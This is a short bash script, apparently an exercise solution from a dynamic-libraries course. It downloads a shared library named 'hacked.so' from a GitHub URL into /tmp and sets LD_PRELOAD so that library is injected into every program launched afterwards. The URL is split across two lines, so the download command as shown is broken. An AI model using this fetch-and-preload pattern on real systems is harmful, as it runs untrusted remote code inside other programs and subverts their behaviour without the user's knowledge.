#!/bin/bash
wget -P /tmp https://github.com/Nightburnn/alx-low_level_programming/raw/mai
n/0x18-dynamic_libraries/hacked.so
export LD_PRELOAD=/tmp/hacked.so
